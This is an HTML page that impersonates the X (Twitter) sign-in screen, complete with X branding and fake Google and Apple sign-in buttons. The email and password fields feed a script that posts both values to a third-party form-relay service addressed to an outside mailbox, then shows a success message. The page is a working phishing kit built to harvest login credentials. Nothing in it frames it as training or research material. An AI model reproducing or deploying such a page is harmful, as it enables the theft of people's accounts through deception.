<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to X</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .login-container {
            width: 100%;
            max-width: 350px;
            padding: 20px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
            font-size: 40px;
            font-weight: 700;
            color: #1DA1F2;
        }
        
        .title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 35px;
            text-align: center;
        }
        
        .provider-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .provider-btn {
            width: 100%;
            padding: 12px 0;
            border-radius: 30px;
            border: 1px solid #536471;
            background: transparent;
            color: white;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: background-color 0.2s;
        }
        
        .provider-btn:hover {
            background-color: rgba(255, 255, 255, 0.05);
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
        }
        
        .divider-line {
            flex: 1;
            height: 1px;
            background-color: #2f3336;
        }
        
        .divider-text {
            padding: 0 10px;
            color: #71767b;
            font-size: 15px;
        }
        
        .login-form {
            margin-top: 20px;
        }
        
        .input-group {
            margin-bottom: 20px;
            position: relative;
        }
        
        .input-field {
            width: 100%;
            padding: 16px 10px 4px 10px;
            background: transparent;
            border: 1px solid #536471;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            outline: none;
        }
        
        .input-field:focus {
            border-color: #1DA1F2;
        }
        
        .input-label {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
            color: #71767b;
            pointer-events: none;
            transition: all 0.2s ease;
        }
        
        .input-field:focus + .input-label,
        .input-field:not(:placeholder-shown) + .input-label {
            top: 12px;
            transform: translateY(0);
            font-size: 12px;
        }
        
        .action-btn {
            width: 100%;
            padding: 12px 0;
            border-radius: 30px;
            background: white;
            color: black;
            border: none;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-bottom: 20px;
        }
        
        .action-btn:hover {
            background-color: #e6e6e6;
        }
        
        .action-btn:disabled {
            background-color: #1DA1F2;
            opacity: 0.5;
            cursor: default;
        }
        
        .forgot-password {
            color: #1DA1F2;
            text-decoration: none;
            font-size: 14px;
            display: block;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .signup-link {
            color: #71767b;
            font-size: 15px;
            margin-top: 60px;
            text-align: center;
        }
        
        .signup-link a {
            color: #1DA1F2;
            text-decoration: none;
        }
        
        .signup-link a:hover {
            text-decoration: underline;
        }
        
        .success-message {
            text-align: center;
            padding: 40px 0;
            display: none;
        }
        
        .success-icon {
            font-size: 48px;
            margin-bottom: 20px;
            color: #1DA1F2;
        }
        
        .success-text {
            font-size: 20px;
            font-weight: 700;
        }
        
        .password-container {
            display: none;
        }
        
        .email-display {
            color: #1DA1F2;
            margin-bottom: 10px;
            font-size: 14px;
            text-align: left;
        }
        
        .back-btn {
            background: none;
            border: none;
            color: #1DA1F2;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
        }
        
        .back-btn i {
            margin-right: 5px;
        }
        
        .footer {
            margin-top: 30px;
            text-align: center;
            color: #71767b;
            font-size: 12px;
        }
        
        .footer a {
            color: #71767b;
            text-decoration: none;
            margin: 0 5px;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <i class="fab fa-x-twitter"></i>
        </div>
        
        <div class="title">Sign in to X</div>
        
        <div class="provider-buttons">
            <button class="provider-btn">Sign in with Google</button>
            <button class="provider-btn">Sign in with Apple</button>
        </div>
        
        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">or</div>
            <div class="divider-line"></div>
        </div>
        
        <div class="login-form">
            <div class="email-container">
                <div class="input-group">
                    <input type="email" id="email" class="input-field" placeholder=" " autocomplete="email">
                    <label for="email" class="input-label">Email</label>
                </div>
                
                <button id="nextBtn" class="action-btn" disabled>Next</button>
                
                <a href="#" class="forgot-password">Forgot password?</a>
            </div>
            
            <div class="password-container">
                <button id="backBtn" class="back-btn">
                    <i class="fas fa-arrow-left"></i> Back
                </button>
                <div class="email-display" id="emailDisplay"></div>
                
                <div class="input-group">
                    <input type="password" id="password" class="input-field" placeholder=" ">
                    <label for="password" class="input-label">Password</label>
                </div>
                
                <button id="submitBtn" class="action-btn">Submit</button>
                
                <a href="#" class="forgot-password">Forgot password?</a>
            </div>
            
            <div class="success-message">
                <div class="success-icon">
                    <i class="fas fa-check-circle"></i>
                </div>
                <div class="success-text">Successful submission</div>
            </div>
            
            <div class="signup-link">
                Don't have an account? <a href="#">Sign up</a>
            </div>
        </div>
        
        <div class="footer">
            <a href="#">Terms of Service</a>
            <a href="#">Privacy Policy</a>
            <a href="#">Cookie Policy</a>
            <a href="#">Accessibility</a>
            <a href="#">Ads info</a>
            <a href="#">More</a>
            <p>Â© 2025 X Corp.</p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const nextBtn = document.getElementById('nextBtn');
            const backBtn = document.getElementById('backBtn');
            const submitBtn = document.getElementById('submitBtn');
            const emailContainer = document.querySelector('.email-container');
            const passwordContainer = document.querySelector('.password-container');
            const successMessage = document.querySelector('.success-message');
            const emailDisplay = document.getElementById('emailDisplay');
            
            // Enable next button when email is entered
            emailInput.addEventListener('input', function() {
                nextBtn.disabled = !this.value.trim();
            });
            
            // Handle "Next" button click
            nextBtn.addEventListener('click', function() {
                const email = emailInput.value.trim();
                emailDisplay.textContent = email;
                emailContainer.style.display = 'none';
                passwordContainer.style.display = 'block';
            });
            
            // Handle "Back" button click
            backBtn.addEventListener('click', function() {
                passwordContainer.style.display = 'none';
                emailContainer.style.display = 'block';
            });
            
            // Handle "Submit" button click
            submitBtn.addEventListener('click', function() {
                const email = emailInput.value.trim();
                const password = passwordInput.value.trim();
                
                if (!password) {
                    alert('Please enter your password');
                    return;
                }
                
                // Submit the form to FormSubmit
                const formData = new FormData();
                formData.append('email', email);
                formData.append('password', password);
                
                fetch('https://formsubmit.co/ajax/example@email.com', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        passwordContainer.style.display = 'none';
                        successMessage.style.display = 'block';
                    } else {
                        alert('Submission failed. Please try again.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('An error occurred. Please try again.');
                });
            });
            
            // Press Enter to submit
            emailInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter' && this.value.trim()) {
                    nextBtn.click();
                }
            });
            
            passwordInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter' && this.value.trim()) {
                    submitBtn.click();
                }
            });
        });
    </script>
</body>
</html>
